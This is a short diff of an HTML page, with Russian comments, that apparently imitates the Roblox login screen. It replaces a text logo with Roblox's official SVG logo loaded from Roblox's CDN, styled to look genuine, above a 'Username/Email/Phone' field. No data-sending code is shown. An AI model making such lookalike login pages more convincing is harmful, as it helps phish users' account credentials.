@@ -73,19 +73,18 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 15px;
+            margin-top: 10px;
             position: relative;
             z-index: 10;
         }
 
-        /* Стопроцентно надежный логотип-текст, который не сломается никогда */
-        .roblox-brand {
-            font-size: 36px;
-            font-weight: 900;
-            letter-spacing: 2px;
-            color: #ffffff;
-            margin-bottom: 28px;
-            text-transform: uppercase;
+        /* Стопроцентно надежный логотип через SVG-файл с официального хранилища Roblox */
+        .roblox-logo-img {
+            width: 135px;
+            height: auto;
+            margin-bottom: 26px;
+            object-fit: contain;
+            filter: brightness(0) invert(1); /* Делает логотип чисто белым */
         }
 
         .input-box {
@@ -215,8 +214,8 @@
     </div>
 
     <div class="container">
-        <!-- Текстовый логотип, который физически не может разорваться или съехать -->
-        <div class="roblox-brand">Roblox</div>
+        <!-- Официальный фирменный логотип Roblox (цельная графика с тем самым квадратом внутри O) -->
+        <img class="roblox-logo-img" src="https://images.rbxcdn.com/3d6d548b284e82ac813b573d6d548b28.svg" alt="Roblox">
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
